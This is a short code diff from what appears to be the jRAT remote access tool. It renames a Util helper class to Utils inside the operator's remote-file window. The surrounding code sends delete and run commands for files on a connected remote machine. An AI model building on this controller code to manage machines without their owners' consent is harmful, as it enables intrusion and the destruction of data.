@@ -62,7 +62,7 @@ import pro.jrat.settings.FileBookmarks;
 import pro.jrat.ui.components.Table;
 import pro.jrat.ui.renderers.table.FileViewTableRenderer;
 import pro.jrat.utils.IconUtils;
-import pro.jrat.utils.Util;
+import pro.jrat.utils.Utils;
 
 
 @SuppressWarnings("serial")
@@ -257,10 +257,10 @@ public class FrameRemoteFiles extends BaseFrame {
 		btnDelete.setToolTipText("Delete");
 		btnDelete.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				String[] files = Util.getFiles(table.getSelectedRows(), model);
+				String[] files = Utils.getFiles(table.getSelectedRows(), model);
 				if (files != null) {
 					for (String file : files) {
-						if (Util.yesNo("Confirm", "Confirm deleting " + file)) {
+						if (Utils.yesNo("Confirm", "Confirm deleting " + file)) {
 							sl.addToSendQueue(new Packet16DeleteFile(file));
 						}
 					}
@@ -357,10 +357,10 @@ public class FrameRemoteFiles extends BaseFrame {
 		btnDeleteme.setToolTipText("Delete");
 		btnDeleteme.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
-				String[] files = Util.getFiles(tableme.getSelectedRows(), modelme);
+				String[] files = Utils.getFiles(tableme.getSelectedRows(), modelme);
 				if (files != null) {
 					for (String file : files) {
-						if (Util.yesNo("Confirm", "Confirm deleting " + file)) {
+						if (Utils.yesNo("Confirm", "Confirm deleting " + file)) {
 							new File(file).delete();
 						}
 					}
@@ -476,7 +476,7 @@ public class FrameRemoteFiles extends BaseFrame {
 		mntmRun.addActionListener(new ActionListener() {
 			@Override
 			public void actionPerformed(ActionEvent arg0) {
-				String[] files = Util.getFiles(table.getSelectedRows(), model);
+				String[] files = Utils.getFiles(table.getSelectedRows(), model);
 				if (files != null) {
 					for (String file : files) {
 						sl.addToSendQueue(new Packet38RunCommand(file));
@@ -513,7 +513,7 @@ public class FrameRemoteFiles extends BaseFrame {
 		mntmPreviewFiletext.addActionListener(new ActionListener() {
 			@Override
 			public void actionPerformed(ActionEvent arg0) {
-				String[] files = Util.getFiles(table.getSelectedRows(), model);
+				String[] files = Utils.getFiles(table.getSelectedRows(), model);
 				if (files != null) {
 					for (String file : files) {
 						if (file.toLowerCase().endsWith(".png") || file.toLowerCase().endsWith(".jpg") || file.toLowerCase().endsWith(".jpeg") || file.toLowerCase().endsWith(".gif")) {
@@ -590,10 +590,10 @@ public class FrameRemoteFiles extends BaseFrame {
 		mntmDelete.addActionListener(new ActionListener() {
 			@Override
 			public void actionPerformed(ActionEvent e) {
-				String[] files = Util.getFiles(table.getSelectedRows(), model);
+				String[] files = Utils.getFiles(table.getSelectedRows(), model);
 				if (files != null) {
 					for (String file : files) {
-						if (Util.yesNo("Confirm", "Confirm deleting " + file)) {
+						if (Utils.yesNo("Confirm", "Confirm deleting " + file)) {
 							sl.addToSendQueue(new Packet16DeleteFile(file));
 						}
 					}
